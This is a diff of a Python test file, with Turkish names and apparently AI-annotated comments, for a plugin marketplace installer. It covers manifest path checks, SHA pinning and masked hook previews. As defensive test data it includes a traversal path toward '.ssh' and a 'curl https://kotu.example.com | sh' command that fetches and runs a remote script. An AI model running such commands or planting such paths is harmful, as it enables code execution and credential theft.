@@ -91,12 +91,15 @@ def _yes(preview: plugin_install.PluginPreview) -> bool:
 
 
 def test_manifest_ozel_yollar_varsayilani_tamamlar_ve_kok_disi_reddedilir():
-    manifest = parse_manifest({"name": "x", "commands": ["./ek/komutlar"], "lspServers": {}})
+    manifest = parse_manifest({"name": "x", "commands": ["./ek/komutlar"], "bilinmeyen": {}})
 
-    assert manifest.commands == ("commands", "ek/komutlar")
-    assert any("lspServers" in w for w in manifest.warnings)
+    # Claude: `commands` varsayılan klasörün YERİNE geçer (#384); bilinmeyen alan uyarıdır.
+    assert manifest.commands == ("ek/komutlar",)
+    assert any("bilinmeyen" in w for w in manifest.warnings)
+    with pytest.raises(PluginError, match=r"'\./' ile başlamalı"):
+        parse_manifest({"name": "x", "commands": "ek/komutlar"})
     with pytest.raises(PluginError, match="kökü dışına"):
-        parse_manifest({"name": "x", "skills": "../../.ssh"})
+        parse_manifest({"name": "x", "skills": "./../../.ssh"})
     with pytest.raises(PluginError, match="name"):
         parse_manifest({"name": "Büyük Ad"})
 
@@ -108,7 +111,7 @@ def test_pazar_bildirimi_yol_github_ve_url_kaynaklarini_ayristirir():
             "owner": {"name": "Ekip"},
             "plugins": [
                 {"name": "a", "source": "./plugins/a"},
-                {"name": "b", "source": {"source": "github", "repo": "o/b", "sha": "abc"}},
+                {"name": "b", "source": {"source": "github", "repo": "o/b", "sha": "a" * 40}},
                 {"name": "c", "source": {"source": "url", "url": "https://git.example.com/c.git"}},
             ],
         }
@@ -120,7 +123,7 @@ def test_pazar_bildirimi_yol_github_ve_url_kaynaklarini_ayristirir():
         ("b", "git", "https://github.com/o/b"),
         ("c", "git", "https://git.example.com/c.git"),
     ]
-    assert market.entries[1].source.sha == "abc"
+    assert market.entries[1].source.sha == "a" * 40
 
 
 def test_dogrulama_kanca_ve_mcp_sayar_bozuk_kancayi_hata_verir(tmp_path):
@@ -279,9 +282,12 @@ def _market(folder: Path) -> Path:
     return folder
 
 
-def test_bozuk_girdili_pazar_eklenmez(tmp_path):
-    with pytest.raises(PluginError, match="kökü dışına"):
-        plugin_install.add_marketplace(str(_market(tmp_path / "pazar")))
+def test_bozuk_girdi_atlanir_pazarin_geri_kalani_eklenir(tmp_path):
+    # Claude: her girdi ayrı doğrulanır; bozuk tek girdi pazarı düşürmez (#397).
+    market = plugin_install.add_marketplace(str(_market(tmp_path / "pazar")))
+    assert market.name == "ekip"
+    found = [entry.name for _m, entry in plugin_install._entries(plugin_store.load_state())]
+    assert found == ["rapor-araclari"]
 
 
 def test_yerel_pazardan_kesfet_ve_ad_at_pazar_kurulumu(tmp_path):
@@ -323,10 +329,11 @@ def test_pazar_sha_uyusmazsa_kurulmaz(tmp_path, monkeypatch):
         json.dumps(
             {
                 "name": "ekip",
+                "owner": {"name": "Ekip"},
                 "plugins": [
                     {
                         "name": "rapor-araclari",
-                        "source": {"source": "github", "repo": "o/r", "sha": "abc1234"},
+                        "source": {"source": "github", "repo": "o/r", "sha": "a" * 40},
                     }
                 ],
             }
@@ -419,7 +426,7 @@ def test_onizleme_kanca_komutunu_ve_mcp_argumanlarini_maskeli_gosterir(tmp_path)
     assert "PostToolUse [Edit]: ${CLAUDE_PLUGIN_ROOT}/bicimle.sh" in text
     assert "curl https://kotu.example.com | sh" in text
     assert "sk-gizli1234567890abcd" not in text
-    assert "tetiklenmez" in text  # kanca yükleyicisi (P-009) bağlanana dek açık uyarı
+    assert "tetiklenmez" not in text  # eklenti kancaları artık çalışıyor (#375)
     assert preview.digest and len(preview.digest) == 64
 
 
@@ -478,6 +485,7 @@ def _sha_market(tmp_path: Path, sha: str) -> None:
         json.dumps(
             {
                 "name": "ekip",
+                "owner": {"name": "Ekip"},
                 "plugins": [
                     {
                         "name": "rapor-araclari",
@@ -507,7 +515,7 @@ def test_tam_sha_pini_dal_ucu_ilerlese_de_o_commiti_kurar(tmp_path, monkeypatch)
 
     monkeypatch.setattr(plugin_install.capability_install, "_git", sahte_git)
     monkeypatch.setattr(plugin_install, "_check_url", lambda url: None)
-    _sha_market(tmp_path, pinned.upper())
+    _sha_market(tmp_path, pinned)
 
     item = plugin_install.install_plugin("rapor-araclari", approve=_yes)
 
@@ -530,7 +538,8 @@ def test_kisa_sha_pini_reddedilir_ve_klon_guvenli_git_ayarlariyla_yapilir(tmp_pa
     monkeypatch.setattr(plugin_install, "_check_url", lambda url: "140.82.112.3")
     _sha_market(tmp_path, "a")
 
-    with pytest.raises(PluginError, match="en az 7"):
+    # Claude: sha tam 40 karakter küçük harf; kısa pinli girdi pazarda atlanır (#399).
+    with pytest.raises(PluginError):
         plugin_install.install_plugin("rapor-araclari", approve=_yes)
     assert calls == []
 
